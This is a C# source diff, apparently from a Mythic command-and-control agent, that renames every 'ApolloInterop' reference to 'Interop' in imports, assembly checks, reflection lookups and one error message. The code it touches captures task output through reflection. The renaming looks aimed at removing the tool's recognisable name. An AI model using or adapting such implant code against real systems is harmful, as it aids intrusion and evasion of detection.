@@ -8,9 +8,9 @@
 
 using System;
 using System.Linq;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using Interop.Classes;
+using Interop.Interfaces;
+using Interop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.Threading;
 using System.IO;
@@ -19,8 +19,8 @@ using System.Runtime.InteropServices;
 using System.Reflection;
 using System.Runtime.CompilerServices;
 using System.Security.Principal;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Utils;
+using Interop.Classes.Api;
+using Interop.Utils;
 
 namespace Tasks
 {
@@ -217,7 +217,7 @@ namespace Tasks
                 }
                 else
                 {
-                    resp = CreateTaskResponse("Failed to get ApolloInterop dependency.", true, "error");
+                    resp = CreateTaskResponse("Failed to get Interop dependency.", true, "error");
                 }
             }
             catch (Exception ex)
@@ -359,7 +359,7 @@ namespace Tasks
                 Assembly interop2 = null;
                 foreach (var asm2 in AppDomain.CurrentDomain.GetAssemblies())
                 {
-                    if (asm2.FullName.StartsWith("ApolloInterop"))
+                    if (asm2.FullName.StartsWith("Interop"))
                     {
                         interop2 = asm2;
                         break;
@@ -369,7 +369,7 @@ namespace Tasks
                 {
                     return;
                 }
-                Type tStringEventArgs = interop2.GetType("ApolloInterop.Classes.Events.StringDataEventArgs");
+                Type tStringEventArgs = interop2.GetType("Interop.Classes.Events.StringDataEventArgs");
                 FieldInfo fiData = tStringEventArgs.GetField("Data");
                 string data = fiData.GetValue(args) as string;
                 if (!string.IsNullOrEmpty(data))
@@ -380,7 +380,7 @@ namespace Tasks
             Assembly interopAsm = null;
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
-                if (asm.FullName.StartsWith("ApolloInterop"))
+                if (asm.FullName.StartsWith("Interop"))
                 {
                     interopAsm = asm;
                 }
@@ -397,7 +397,7 @@ namespace Tasks
             var callbackMethod = (EventHandler<EventArgs>)OnWrite;
             
             
-            Type tWriter = interopAsm.GetType("ApolloInterop.Classes.IO.EventableStringWriter");
+            Type tWriter = interopAsm.GetType("Interop.Classes.IO.EventableStringWriter");
 
             var writer = Activator.CreateInstance(tWriter);
             EventInfo eiWrite = tWriter.GetEvent("BufferWritten");
